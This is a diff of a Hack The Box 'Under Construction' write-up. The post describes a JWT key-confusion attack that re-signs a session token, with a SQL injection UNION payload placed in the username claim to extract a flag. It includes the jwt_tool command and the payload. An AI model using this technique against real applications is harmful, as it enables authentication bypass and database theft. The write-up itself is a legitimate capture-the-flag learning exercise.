@@ -2,6 +2,9 @@
 layout: post
 title: Hack The Box - Under Construction
 date: 2023-03-03 20:26 +0100
+image:
+  path: /assets/img/posts/under-construction/under-construction-card.png
+  alt: Under construction card
 categories: [HackTheBox, Beginner Track]
 tags: [Hack-The-Box-Easy, jwt-key-confusion]
 ---
@@ -15,36 +18,34 @@ FILE : 1 zip folder (Under Construction)
 
 
 ## Tools used
-  
-  - [jwt io](https://jwt.io/) : allows you to decode, verify and generate JWT.
-  - [JWT tool](https://github.com/ticarpi/jwt_tool/tree/master) : jwt_tool.py is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).
+
+- [jwt io](https://jwt.io/) : allows you to decode, verify and generate JWT.
+- [JWT tool](https://github.com/ticarpi/jwt_tool/tree/master) : jwt_tool is a toolkit for validating, forging, scanning and tampering JWTs (JSON Web Tokens).
 
 
 ## What to do ?
 
-  <!-- - First, we'll scan the given port with `nmap` to see what service is running on that port. -->
+- First, we'll scan the given port with `nmap` to see what service is running on that port.
 
 
-<!-- ## Nmap scan on HOST port (32674)
+## Nmap scan
 
 ```
-0bytes> nmap -A -p 32674 188.166.150.33
+rether> nmap -A -p 32674 188.166.150.33
 PORT      STATE SERVICE VERSION
 32674/tcp open  http    Node.js Express framework
 | http-title: Under Construction - Login
 |_Requested resource was /auth
 ```
 
-This website runs on a nodejs express server -->
+This website runs on a nodejs express server
 
 ## Under construction
 
 ![Auth login](/assets/img/posts/under-construction/under-construction-auth.png "Auth login")
 
-
-After many attempts with the default usernames and passwords, I create a new account by clicking on the register button.
+After basic attempts with the default usernames and passwords, We create a new account by clicking on the register button.
 After login, we will see this page :
-
 
 ![Auth login success](/assets/img/posts/under-construction/under-construction-home-panel.png "Auth login success")
 
@@ -73,17 +74,18 @@ Looking at the session cookie, we see that it is a jwt token (it starts with "ey
 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2NzgwMzMyNjd9.EIJxcJw7F7gJwCFoVpDX-wXIBNLYPqu_Dx5m9bEt5FH4PwjUw-mT51kZ5hluFfjac-kY7fIjoEyb2rrz1pq4uUrVCeCKabhpLo6T6YixatTxR1EctdA14meM5K99veQdl4mpOHSoDOTC6kFMDCab78Rbxij8diWP3iaXwffw0S4hOhuU7UtF2A2d6dQMePs6cOQ1oTLiGJhblFfr7O91JlhndWmZH-plIjH9s63EMLbJPzHu8xrNu2Db_To86zg4z0WdhgOfqtMVzzNXw0L-QggvdcI45nWpHaeH0tBMXa2-fJKJzxH7JvScq6nkmAVYcdGGsAW1QyVmCTBudYFCJg
 ```
 
-Thanks to the online tool [jwt io](https://jwt.io/), we can see what is in the token.
+With this online tool [jwt io](https://jwt.io/), we can see what is in the token.
 
 In the decode box we have the username and the public key. Save this public key value in a file.
 
-After many research, I found this [tool](https://github.com/ticarpi/jwt_tool/tree/master). Then I try union injections to find the fulnerabilities to find the table who containt the flag. Below what I use to find this flag.
+After quick research, we found this [tool](https://github.com/ticarpi/jwt_tool/tree/master). Then we can try union injections to find the fulnerabilities to find the table who containt the flag. Below what we use to find this flag.
 
 ```bash
-0bytes> ./jwt_tool.py [jwt token] -I -pc username -pv "admin' AND '1'='1' UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--" -X k -pk public.pem
+rether> ./jwt_tool.py [jwt token] -I -pc username -pv "admin' AND '1'='1' UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--" -X k -pk public.pem
 ```
 
 > Command explained :
+
  - `-I` : inject new claims and update existing claims with new values
  - `-pc` : payload key
  - `-pv` : payload value (sql injection)
@@ -91,10 +93,12 @@ After many research, I found this [tool](https://github.com/ticarpi/jwt_tool/tre
  - `-pk` : public key
 {: .prompt-info }
 
-And I use `burpsuite` to intercept the request and change the token
+And we use `burpsuite` to intercept the request and change the token
 
 ## Flag JWT - tool :
 
 ```
 HTB{...}
 ```
+
+![Under construction pwned](/assets/img/posts/under-construction/under-contruction-pwned.png "Under construction pwned")
